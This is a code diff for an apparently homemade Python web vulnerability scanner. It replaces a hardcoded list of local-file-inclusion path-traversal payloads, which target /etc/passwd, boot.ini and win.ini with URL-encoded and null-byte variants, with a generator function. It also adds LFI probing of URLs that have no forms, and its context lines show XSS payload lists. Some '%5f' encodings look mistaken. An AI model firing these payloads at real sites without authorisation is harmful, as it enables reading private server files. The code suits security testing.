@@ -17,37 +17,38 @@ xss_attacks = [ "<script>alert(1);</script>", "<script>prompt(1)</script>",
                 "</title><script>alert(1);</script>", "<body background=\"javascript:alert(1)\">",
                 "<img src=test123456.jpg onerror=alert(1)>"]
 
-lfi_attacks = [
-                #linux
-                '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',
-                '../../../../../etc/passwd', '../../../../../../etc/passwd',
-                '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',
-                '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-                '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00',
-                '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00',
-                '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00',
-                '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
-                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
-                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
+lfi_attacks = []
 
-                #windows
-                '../../boot.ini', '../../../boot.ini', '../../../../boot.ini',
-                '../../../../../boot.ini', '../../../../../../boot.ini',
-                '../../../../../../../boot.ini', '../../../../../../../../boot.ini',
-                '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
-                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
-                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
-                '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00',
-                '../../../../../boot.ini%00', '../../../../../../boot.ini%00',
-                '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00',
-                '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
-                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
-                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini'
-                ]
+lfi_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin', '; for 16-bit app support']
 
-lfi_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin']
+def generate_lfi_attacks():
+    global lfi_attacks
+    for i in range(2,10):
+        #linux
+        lfi_attacks.append('../' * i + 'etc/passwd')
+        lfi_attacks.append('../' * i + 'etc/passwd%00')
+        lfi_attacks.append('%2e%2e%2f' * i + 'etc%2fpasswd')
+        lfi_attacks.append('%2e%2e%2f' * i + 'etc%2fpasswd%00')
+
+        #windows
+        lfi_attacks.append('../' * i + 'boot.ini')
+        lfi_attacks.append('../' * i + 'boot.ini%00')
+        lfi_attacks.append('%2e%2e%2f' * i + 'boot.ini')
+        lfi_attacks.append('%2e%2e%2f' * i + 'boot.ini%00')
+        lfi_attacks.append('..%5f' * i + 'boot.ini')
+        lfi_attacks.append('..%5f' * i + 'boot.ini%00')
+        lfi_attacks.append('%2e%2e%5f' * i + 'boot.ini')
+        lfi_attacks.append('%2e%2e%5f' * i + 'boot.ini%00')
+
+        lfi_attacks.append('../' * i + 'windows/win.ini')
+        lfi_attacks.append('../' * i + 'windows/win.ini%00')
+        lfi_attacks.append('%2e%2e%2f' * i + 'windows%2fwin.ini')
+        lfi_attacks.append('%2e%2e%2f' * i + 'windows%2fwin.ini%00')
+        lfi_attacks.append('..%5f' * i + 'windows%5fwin.ini')
+        lfi_attacks.append('..%5f' * i + 'windows%5fwin.ini%00')
+        lfi_attacks.append('%2e%2e%5f' * i + 'windows%5fwin.ini')
+        lfi_attacks.append('%2e%2e%5f' * i + 'windows%5fwin.ini%00')
+
 
 def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
     global xss_attacks
@@ -138,6 +139,9 @@ def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value,
         if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
             for i in range(0,len(hidden_param_name)):
                 post_params[hidden_param_name[i]] = hidden_param_value[i]
+
+        if len(post_params) == 0:
+            post_params[0] = lfi
 
         if method.find("get") == 0:
             r=requests.get(url = furl, params = post_params)
@@ -246,7 +250,7 @@ if __name__ == "__main__":
 
     scanopt ="--all"
     url = ""
-    
+
     if sys.argv[1].find("http") == 0:
         url = sys.argv[1]
         if len(sys.argv) == 3:
@@ -269,6 +273,10 @@ if __name__ == "__main__":
         exit()
 
     print "[+] Host acquired " + host
+
+    #generate LFI attack data (urls)
+    generate_lfi_attacks()
+
     print "[+] Retrieve page"
     try:
         r = requests.get(url)
@@ -279,6 +287,11 @@ if __name__ == "__main__":
             f.write(s)
 
         scan_for_forms("tmpage.txt", host, url, scanopt)
+
+        #check for LFI even if there are no forms
+        if scanopt.find("--checklfi") == 0:
+            check_lfi(host, "", "get", "", "", "", 0, url)
+
         if DEBUG == 0:
             os.remove("tmpage.txt")
     except Exception, e:
